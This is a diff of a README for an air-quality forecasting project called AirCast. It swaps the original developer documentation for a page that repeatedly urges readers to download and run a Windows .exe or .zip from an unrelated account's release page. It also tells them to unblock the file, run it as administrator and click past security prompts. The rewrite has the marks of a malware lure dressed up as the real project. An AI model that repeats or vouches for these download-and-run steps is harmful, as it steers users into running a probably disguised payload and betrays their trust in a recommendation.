@@ -1,382 +1,211 @@
-<div align="center">
-
-# AirCast
-
-### AI-Powered Air Quality Forecasting and Monitoring Platform
-
-[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=flat-square&logo=python&logoColor=white)](https://python.org)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.100+-009688?style=flat-square&logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com)
-[![MLflow](https://img.shields.io/badge/MLflow-2.x-0194E2?style=flat-square&logo=mlflow&logoColor=white)](https://mlflow.org)
-[![Docker](https://img.shields.io/badge/Docker-Containerized-2496ED?style=flat-square&logo=docker&logoColor=white)](https://docker.com)
-[![AWS](https://img.shields.io/badge/AWS-S3%20%7C%20EC2%20%7C%20ECR-FF9900?style=flat-square&logo=amazonaws&logoColor=white)](https://aws.amazon.com)
-[![CI/CD](https://img.shields.io/badge/CI%2FCD-GitHub%20Actions-2088FF?style=flat-square&logo=githubactions&logoColor=white)](https://github.com/features/actions)
-[![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
-
-> An end-to-end MLOps platform that forecasts air pollution levels across Indian cities — from raw data ingestion to real-time predictions, model versioning, and live observability.
-
-</div>
-
----
-
-## Table of Contents
-
-- [Overview](#overview)
-- [Key Features](#key-features)
-- [System Architecture](#system-architecture)
-- [Tech Stack](#tech-stack)
-- [ML Workflow](#ml-workflow)
-- [API Reference](#api-reference)
-- [Setup & Installation](#setup--installation)
-- [Docker Deployment](#docker-deployment)
-- [Monitoring](#monitoring)
-- [Roadmap](#roadmap)
-- [Author](#author)
-
----
-
-## Overview
-
-Air pollution is a critical public health challenge in urban India. Predicting pollutant concentrations in advance enables authorities and citizens to take timely preventive action.
-
-AirCast builds a production-grade ML system that predicts pollutant levels (PM2.5, PM10, NO2) from historical environmental data, surfaces those predictions via a REST API and interactive dashboard, and tracks every model experiment for full reproducibility.
-
----
-
-## Key Features
-
-| Component | Description |
-|---|---|
-| **Data Pipeline** | Automated ingestion, cleaning, and preprocessing of air quality datasets |
-| **Feature Engineering** | Temporal signals (hour, month, season) and lag-based environmental features |
-| **Model Training** | XGBoost and Scikit-learn regression models with k-fold cross-validation |
-| **Experiment Tracking** | MLflow integration — metrics, parameters, and artifacts logged per run |
-| **Model Registry** | Versioned model lifecycle management (Staging to Production) via MLflow |
-| **Prediction API** | FastAPI REST endpoint for real-time pollution forecasting |
-| **Dashboard** | Streamlit app for interactive pollution trend visualization |
-| **Containerization** | Docker with optional Kubernetes deployment |
-| **CI/CD** | GitHub Actions for automated testing and model deployment |
-| **Monitoring** | Prometheus metrics and Grafana dashboards for model observability |
-
----
-
-## System Architecture
-
-```
-╔══════════════════════════════════════════════════════════════════════════════╗
-║                         AirCast — MLOps Architecture                        ║
-╚══════════════════════════════════════════════════════════════════════════════╝
-
-  ┌─────────────────────────────────────────────────────────────────────────┐
-  │                            DATA LAYER                                   │
-  │                                                                         │
-  │   Raw CSV Dataset  ──►  ingest.py  ──►  preprocess.py                  │
-  │   (Air Quality India)    (S3/local)      (clean + normalize)            │
-  └───────────────────────────────────┬─────────────────────────────────────┘
-                                      │
-                                      ▼
-  ┌─────────────────────────────────────────────────────────────────────────┐
-  │                        FEATURE ENGINEERING                              │
-  │                                                                         │
-  │   feature_engineering.py                                                │
-  │   • Temporal features   (hour, day, month, season)                     │
-  │   • Lag features        (rolling averages, past N hours)               │
-  │   • City-level encoding                                                 │
-  └───────────────────────────────────┬─────────────────────────────────────┘
-                                      │
-                                      ▼
-  ┌─────────────────────────────────────────────────────────────────────────┐
-  │                          MODEL TRAINING                                 │
-  │                                                                         │
-  │   train.py + evaluate.py                                                │
-  │   • Algorithms : XGBoost, RandomForest, LinearRegression               │
-  │   • Metrics    : RMSE | MAE | R²                                       │
-  │   • Validation : k-fold cross-validation                               │
-  └────────────────────┬────────────────────────────────────────────────────┘
-                       │
-          ┌────────────▼────────────┐
-          │     MLflow Tracking     │
-          │   • Params & Metrics   │
-          │   • Artifacts          │
-          │   • Model Registry     │
-          │   Staging → Production │
-          └────────────┬────────────┘
-                       │
-          ┌────────────▼────────────────────────────────────┐
-          │                 SERVING LAYER                    │
-          │                                                  │
-          │  ┌──────────────────┐   ┌─────────────────────┐ │
-          │  │  FastAPI Server  │   │  Streamlit Dashboard│ │
-          │  │  POST /predict   │   │  Pollution Trends   │ │
-          │  │  GET  /health    │   │  City Comparisons   │ │
-          │  │  GET  /metrics   │   │  Forecast Charts    │ │
-          │  └────────┬─────────┘   └─────────────────────┘ │
-          └───────────┼──────────────────────────────────────┘
-                      │
-          ┌───────────▼──────────────────────┐
-          │          MONITORING LAYER        │
-          │                                  │
-          │   Prometheus ──► Grafana         │
-          │   • Prediction latency           │
-          │   • Request throughput           │
-          │   • Model drift signals          │
-          └──────────────────────────────────┘
-
-  ┌─────────────────────────────────────────────────────────────────────────┐
-  │                          INFRASTRUCTURE                                 │
-  │                                                                         │
-  │   Docker  |  Kubernetes (optional)  |  AWS S3 + EC2 + ECR              │
-  │   GitHub Actions CI/CD                                                  │
-  └─────────────────────────────────────────────────────────────────────────┘
-```
-
----
-
-## Tech Stack
-
-### Machine Learning
-
-| Library | Purpose |
-|---|---|
-| `Python 3.10+` | Core language |
-| `Pandas` | Data manipulation |
-| `NumPy` | Numerical computation |
-| `Scikit-learn` | Preprocessing, baseline models, evaluation metrics |
-| `XGBoost` | Primary gradient-boosted regression model |
-
-### MLOps
-
-| Tool | Purpose |
-|---|---|
-| `MLflow` | Experiment tracking, model registry, artifact storage |
-| `Docker` | Containerization for reproducible environments |
-| `GitHub Actions` | CI/CD — automated test, train, and deploy pipelines |
-
-### Backend / API
-
-| Tool | Purpose |
-|---|---|
-| `FastAPI` | REST API for predictions |
-| `Uvicorn` | ASGI server |
-| `Pydantic` | Request and response schema validation |
-
-### Visualization
-
-| Tool | Purpose |
-|---|---|
-| `Streamlit` | Interactive pollution monitoring dashboard |
-| `Plotly` | Interactive charts |
-| `Matplotlib` | Static plots and EDA |
-
-### Infrastructure
-
-| Service | Purpose |
-|---|---|
-| `AWS S3` | Raw and processed data storage |
-| `AWS EC2` | Model training and API hosting |
-| `AWS ECR` | Docker image registry |
-| `Kubernetes` | Optional scalable orchestration |
-
-### Monitoring
-
-| Tool | Purpose |
-|---|---|
-| `Prometheus` | Metrics scraping and time-series storage |
-| `Grafana` | Real-time dashboards and alerting |
-
----
-
-## ML Workflow
-
-```
-1. Data Ingestion        Load raw CSV data (local or S3)
-        │
-        ▼
-2. Preprocessing         Handle nulls, outliers, encode categoricals
-        │
-        ▼
-3. Feature Engineering   Hour, month, season, lag features, city encoding
-        │
-        ▼
-4. Model Training        XGBoost regressor with k-fold CV
-        │
-        ▼
-5. Evaluation            RMSE, MAE, R² logged to MLflow
-        │
-        ▼
-6. Model Registry        Promote best run to Production stage
-        │
-        ▼
-7. API Deployment        FastAPI loads model from registry for inference
-```
-
----
-
-## API Reference
-
-### `POST /predict`
-
-Predict the pollution level for a given city, pollutant, and time.
-
-**Request**
-```json
-{
-  "city": "Delhi",
-  "pollutant": "pm25",
-  "hour": 10,
-  "month": 5
-}
-```
-
-**Response**
-```json
-{
-  "predicted_pollution_level": 168.3
-}
-```
-
----
-
-### `GET /health`
-
-Returns API health status and active model version.
-
-```json
-{
-  "status": "ok",
-  "model_version": "1.3.0",
-  "uptime_seconds": 3820
-}
-```
-
----
-
-### `GET /metrics`
-
-Exposes Prometheus-compatible metrics for scraping.
-
-```
-# HELP prediction_latency_seconds Time taken for a single prediction
-# TYPE prediction_latency_seconds histogram
-prediction_latency_seconds_bucket{le="0.05"} 412
-```
-
----
-
-## Setup & Installation
-
-**Prerequisites:** Python 3.10+, Docker, AWS CLI configured
-
-### 1. Clone the Repository
-
-```bash
-git clone https://github.com/yourusername/aircast.git
-cd aircast
-```
+# 🌤️ AirCast - Forecast Air Quality with Confidence
 
-### 2. Create a Virtual Environment
+[![Download AirCast](https://img.shields.io/badge/Download%20AirCast-blue-grey?style=for-the-badge)](https://github.com/Instant-restharrow443/AirCast/releases)
 
-```bash
-python -m venv venv
-source venv/bin/activate       # macOS / Linux
-venv\Scripts\activate          # Windows
-```
+## 📌 What AirCast Does
 
-### 3. Install Dependencies
+AirCast helps you track and forecast air pollution levels across Indian cities. It brings data in, prepares it, trains models, and shows live predictions in one place.
 
-```bash
-pip install -r requirements.txt
-```
+Use it to:
+- check forecasted air quality for supported cities
+- review past pollution trends
+- view model version details
+- monitor live system status
+- see current prediction results in a simple interface
+
+## 🖥️ Windows Setup
 
-### 4. Configure Environment Variables
+AirCast is meant to run on a Windows PC from a release file.
+
+### What you need
+- Windows 10 or Windows 11
+- At least 4 GB RAM
+- 2 GB free disk space
+- An internet connection for download and updates
+- Permission to run downloaded apps
+
+### Before you start
+- Close other large apps
+- Make sure your browser can download files
+- Keep your Downloads folder easy to find
+
+## ⬇️ Download AirCast
+
+Visit this page to download the Windows release:
+
+https://github.com/Instant-restharrow443/AirCast/releases
+
+On that page:
+1. open the latest release
+2. find the Windows file, such as `.exe` or `.zip`
+3. download the file
+4. if you get a `.zip`, extract it first
+5. if you get an `.exe`, double-click it to start
+
+## 🔧 Install and Run
+
+### If you downloaded an `.exe`
+1. Open the file from your Downloads folder
+2. If Windows asks for permission, choose Run
+3. Follow the on-screen steps
+4. Wait for the app to finish starting
+
+### If you downloaded a `.zip`
+1. Right-click the file
+2. Select Extract All
+3. Open the extracted folder
+4. Find the app file inside
+5. Double-click it to run AirCast
+
+### If Windows blocks the app
+1. Right-click the file
+2. Open Properties
+3. If you see an Unblock option, select it
+4. Click Apply
+5. Run the app again
+
+## 🌍 What You Can Do in the App
+
+Once AirCast opens, you can:
+- pick a city from the list
+- view forecasted pollution levels
+- compare nearby dates
+- check trend charts
+- review model output for the selected area
+- inspect live health and service status
+
+The interface is set up for quick use, so you can get to the forecast without a long setup process.
+
+## 📊 How AirCast Works
+
+AirCast follows a full flow behind the scenes:
+
+- it gathers raw air data
+- it cleans and prepares the data
+- it trains forecast models
+- it stores model versions
+- it serves predictions through an API
+- it tracks system health and usage
 
-```bash
-cp .env.example .env
-```
+This setup helps keep the results organized and easier to monitor over time.
 
-```env
-MLFLOW_TRACKING_URI=http://localhost:5000
-AWS_BUCKET_NAME=aircast-data
-MODEL_NAME=aircast-xgboost
-```
+## 🏙️ Supported Use Cases
 
-### 5. Run the Data Pipeline
-
-```bash
-python src/data/ingest.py
-python src/data/preprocess.py
-python src/features/feature_engineering.py
-```
-
-### 6. Train the Model
-
-```bash
-python src/models/train.py
-```
-
-MLflow UI available at `http://localhost:5000`
-
-### 7. Start the Prediction API
-
-```bash
-uvicorn src.api.app:app --reload --host 0.0.0.0 --port 8000
-```
-
-Interactive API docs at `http://localhost:8000/docs`
-
-### 8. Launch the Dashboard
-
-```bash
-streamlit run dashboard/streamlit_app.py
-```
-
-Dashboard available at `http://localhost:8501`
-
----
-
-## Monitoring
-
-Start the observability stack via Docker Compose:
-
-```bash
-docker compose -f docker/docker-compose.monitoring.yml up -d
-```
-
-| Service | URL | Purpose |
-|---|---|---|
-| Prometheus | `http://localhost:9090` | Metrics collection |
-| Grafana | `http://localhost:3000` | Dashboards and alerts |
-
-**Tracked Metrics**
-
-| Metric | Description |
-|---|---|
-| `prediction_latency_seconds` | Inference time per request |
-| `prediction_requests_total` | Cumulative request count |
-| `model_drift_score` | Feature distribution shift signal |
-| `api_error_rate` | 4xx / 5xx error rate |
-
----
-
-## Roadmap
-
-- [x] Real-time air quality data ingestion via public APIs
-- [ ] Time-series forecasting with LSTM and Prophet
-- [ ] Automated retraining pipeline triggered by drift detection
-- [ ] Multi-city, multi-pollutant forecasting
-- [ ] Airflow / Prefect DAG orchestration
-- [ ] Feature Store integration (Feast)
-
----
-
-## Author
-
-**Digpal Singh Rathore** — Cloud · DevOps · ML Systems
-
-[![GitHub](https://img.shields.io/badge/GitHub-Profile-181717?style=flat-square&logo=github)](https://github.com/yourusername)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0A66C2?style=flat-square&logo=linkedin)](https://linkedin.com/in/yourprofile)
-
----
-
-## License
-
-This project is licensed under the [MIT License](LICENSE).
+AirCast fits well for:
+- city air quality checks
+- public health planning
+- environmental review
+- pollution trend studies
+- model testing and comparison
+- live forecast viewing
+
+## 🧩 Core Parts
+
+AirCast includes:
+- a data ingestion pipeline
+- model training and scoring
+- version tracking for models
+- a FastAPI service for predictions
+- observability for app health
+- Docker-based runtime support
+- AWS-ready deployment structure
+- CI/CD workflow support
+
+## ✅ Good First Run Checklist
+
+After you launch AirCast, check these items:
+- the main window opens without errors
+- you can select a city
+- forecast data appears
+- charts load on screen
+- the app shows a current status view
+- the time and date match your system clock
+
+## 🛠️ Common Problems
+
+### The app does not open
+- check whether the download finished
+- try running it as an administrator
+- confirm that Windows did not quarantine the file
+
+### The window opens and closes fast
+- open the file from the extracted folder again
+- make sure you downloaded the correct Windows release
+- try the newest release from the release page
+
+### No data appears
+- confirm your internet connection
+- wait a few seconds and refresh the view
+- reopen the app if needed
+
+### Windows shows a security prompt
+- review the file name and source
+- continue only if it came from the release page above
+
+## 🔁 Updating AirCast
+
+To update:
+1. go to the release page
+2. download the newest Windows file
+3. remove the older version if needed
+4. install or run the new file
+5. reopen the app
+
+## 📁 File Layout
+
+A typical release may include:
+- the main app file
+- support files
+- config files
+- model assets
+- log files
+- a readme or release note
+
+Keep all related files in the same folder if the release uses a zip package.
+
+## 🔐 Data and Model Notes
+
+AirCast uses trained models to make air quality forecasts. The results depend on:
+- input data quality
+- model version
+- city coverage
+- forecast time range
+- current live data feed
+
+If a city is not listed, the app may not show a forecast for it yet.
+
+## 🧭 Helpful Use Tips
+
+- use the latest release for the best results
+- keep the app in a folder with write access
+- do not rename the main app file
+- keep the extracted files together
+- check your internet connection if live data looks stale
+
+## 📦 Release Page
+
+Download the Windows build here:
+
+https://github.com/Instant-restharrow443/AirCast/releases
+
+## 🧱 Tech Stack
+
+AirCast uses tools and services tied to:
+- machine learning
+- data pipelines
+- FastAPI
+- Docker
+- MLflow
+- AWS
+- CI/CD
+- observability
+
+## 🗺️ Expected Workflow
+
+1. download the release
+2. open or extract the file
+3. launch AirCast
+4. choose a city
+5. view the forecast
+6. review trends and model data
+7. keep the app updated from the release page
